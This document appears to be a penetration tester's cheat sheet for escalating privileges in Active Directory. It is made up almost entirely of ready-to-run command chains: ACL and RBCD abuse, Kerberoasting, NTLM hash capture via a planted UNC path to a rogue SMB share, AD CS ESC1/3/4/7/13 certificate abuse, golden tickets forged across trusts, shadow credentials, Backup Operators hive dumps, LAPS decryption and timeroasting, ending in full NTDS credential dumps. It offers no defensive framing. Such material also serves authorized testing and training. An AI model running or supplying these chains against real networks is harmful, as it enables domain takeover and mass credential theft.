# Active Directory

Collection → graph analysis → ACL abuse, the standard AD escalation loop once you have one domain credential.

```bash
nxc smb <DC_IP> -u <USER> -p '<PASS>'
nxc smb <DC_IP> -u <USER> -p '<PASS>' --generate-hosts-file hosts
# /etc/hosts: <DC_IP>  <DC_FQDN> <domain> <DC_SHORTNAME>

bloodhound-ce.py -u '<USER>' -p '<PASS>' -d <domain> -dc <DC_FQDN> -ns <DC_IP> -c All --zip

# if BloodHound shows you have AddMember on a privileged-nested group:
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' add groupMember '<GROUP>' <USER>

nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3d / admin
evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
```

RBCD via a self-created machine account (works if `MachineAccountQuota` lets you create one):

```bash
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass '<PW>' \
  -dc-host <DC_SHORTNAME> -domain-netbios <domain> '<domain>/<USER>:<PASS>'

rbcd.py -dc-ip <DC_IP> -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to '<DC_SHORTNAME>$' -action 'write' '<domain>/<USER>:<PASS>'

getST.py -spn 'cifs/<DC_FQDN>' -impersonate 'Administrator' \
  '<domain>/ATTACKERSYSTEM$:<PW>'

export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<REALM>.ccache
smbexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
secretsdump.py -k -no-pass <domain>/Administrator@<DC_FQDN>   # full NTDS dump
```

RBCD also works through an ACL you already hold (`GenericWrite`/`GenericAll` on a computer object) — skip the machine-account creation step and go straight to `rbcd.py ... -delegate-from <existing-account> -action write`.

Kerberoasting / AS-REP roasting / RID cycling (no special rights needed to start):

```bash
nxc smb <DC_IP> -u guest -p '' --rid                              # RID cycling via null/guest session -> usernames
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt         # accounts with "no preauth required"
hashcat -a0 -m18200 asrep.txt <WORDLIST>

nxc ldap <DC_IP> -u guest -p '' --kerberoasting kerb.txt           # kerberoastable SPNs, even unauthenticated
hashcat -a0 -m13100 kerb.txt <WORDLIST>

# targeted kerberoast: if you have GenericWrite on a user with no SPN, give them one and roast just them
targetedKerberoast.py -d <domain> -u <USER> -p '<PASS>' --request-user <TARGET_USER> --dc-ip <DC_IP>
hashcat -a0 -m13100 <target>.blob <WORDLIST>
```

NTLM coercion from a writable share (when direct cred access stalls): drop a file containing a UNC path (e.g. inside a script a scheduled job will open) pointing at a rogue SMB listener, capture the resulting NTLMv2 hash, then crack it:

```bash
smbserver.py -smb2support <share-name> <local-dir>   # or Responder/ntlmrelayx, depending on setup
# planted file references: \\<LHOST>\<share-name>\whatever
hashcat -a0 -m5600 hash.txt <WORDLIST>
```

AD CS ESC1 (misconfigured template lets you request a cert for an arbitrary UPN):
```bash
certipy-ad find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
certipy-ad req -username <USER> -password '<PASS>' -ca <CA_NAME> -target <DC_FQDN> \
  -template <vulnerable-template> -upn <target-privileged-user>@<domain> -dns <DC_IP>
certipy-ad auth -pfx <issued>.pfx -dc-ip <DC_IP>        # returns the target's NT hash
```
ESC4: if you only have *write* access to the template object (not an already-vulnerable one), set the flags yourself first, then it's ESC1 from there:
```bash
# via PowerView-style AD object editing:
Set-DomainObject -XOR @{'mspki-enrollment-flag'=2}       # ENROLLEE_SUPPLIES_SUBJECT
Set-DomainObject -Set @{'mspki-certificate-name-flag'=1}
Set-DomainObject -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'}  # Client Auth EKU
```

RBCD empty-hash workaround when the acting account has no usable password (e.g. guest):
```bash
rbcd.py <domain>/guest -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  -dc-ip <DC_IP> -delegate-to <DC>$ -delegate-from <attacker-machine>$ -action write
```

Golden Ticket across a parent/child domain trust — inject an extra SID to get Enterprise Admins instead of just child-domain rights (after DCSync'ing the child's krbtgt):
```bash
ticketer.py -nthash <krbtgt-hash> -domain <child.domain> -domain-sid <child-SID> \
  -extra-sid <parent-domain-SID>-519 Administrator   # 519 = Enterprise Admins RID
```

Shadow Credentials — if you have `GenericWrite` on a user/computer object, add an attacker-controlled key credential instead of resetting their password (quieter, doesn't break their existing access):
```bash
python pywhisker.py -d <domain> -u <USER> -p '<PASS>' --target <TARGET> --action add   # writes msDS-KeyCredentialLink, outputs a PFX
gettgtpkinit.py -cert-pfx <issued>.pfx -pfx-pass <pfx-password> <domain>/<TARGET> <target>.ccache
export KRB5CCNAME=<target>.ccache
getnthash.py -key <session-key-from-pkinit-output> <domain>/<TARGET>   # recover their NT hash via U2U
```

ESC13 (issuance policy OID linked to a privileged group) — certipy flags it directly; just request the template:
```bash
certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -vulnerable
certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <template> -key-size 4096   # bump key size if the default is rejected
certipy auth -pfx <issued>.pfx -dc-ip <DC_IP>
```

ESC3 (template has the Certificate Request Agent EKU) — lets you enroll an agent cert, then use it to request a cert *on behalf of* anyone else:
```bash
certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <enrollment-agent-template>
certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User \
  -on-behalf-of '<DOMAIN>\Administrator' -pfx <agent-cert>.pfx
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

ESC7 (you hold Manage CA / Manage Certificates rights on the CA itself) — approve your own pending request after enabling a privileged template:
```bash
certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -add-officer <USER>
certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -enable-template SubCA
certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -template SubCA \
  -upn 'administrator@<domain>' -sid '<domain-SID>-500'                 # returns a pending request ID
certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -issue-request '<request-ID>'
certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -retrieve '<request-ID>'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

Backup Operators group membership — this group can remotely dump SAM/SYSTEM registry hives without ever getting an interactive session:
```bash
nxc smb <target> -u <USER> -H '<hash>' -M backup_operator    # drives the remote backup+download for you
# or manually:
reg.py '<domain>/<USER>'@<target> -hashes ':<hash>' backup -o '\\<attacker-share>'
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
```

LAPS v2 (DPAPI-NG encrypted blobs) — the plaintext local-admin password is now wrapped in DPAPI-NG, not AES; strip the 16-byte header, then let the DC unwrap it over Kerberos (requires read rights on `msLAPS-EncryptedPassword`, granted to whatever principal the LAPS policy names):
```bash
bloodyAD -d <domain> -u <USER> -k --host <DC_FQDN> msldap laps      # dumps raw blobs (current + password history)
```
```python
import dpapi_ng
data = raw_blob[16:]   # strip the KDSK header
dpapi_ng.ncrypt_unprotect_secret(data, server="<DC_FQDN>", auth_protocol="kerberos").decode("utf-16-le")
```

Deleted-object (tombstone) restore via a `restore` right — if an ACL abuse chain gives you write access to a deleted account's tombstone, restoring it resurrects the account with its original group memberships/ACLs intact, which can reopen an otherwise-closed privilege path:
```bash
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' set restore '<deleted-sAMAccountName>' --newParent '<target-OU-DN>'
```

Targeted Kerberoast against an AES-only account (`msDS-SupportedEncryptionTypes` excludes RC4) — Impacket's `GetUserSPNs.py` requests RC4 by default and gets rejected; patch it to request AES instead:
```bash
sed -i 's/int(constants.EncryptionTypes.rc4_hmac.value)/int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)/g' \
  $(python3 -c "import impacket,os;print(os.path.dirname(impacket.__file__))")/krb5/kerberosv5.py
GetUserSPNs.py -dc-host <DC_FQDN> -request -k -no-pass '<domain>/<USER>$'   # -> $krb5tgs$18$... (etype 18 = AES256)
hashcat -m19700 -a0 hash.txt <WORDLIST>
```

Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
```bash
nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
hashcat --username -a0 -m31300 hashes.txt <WORDLIST>   # mode needs a recent hashcat (7.x); older builds lack it
```

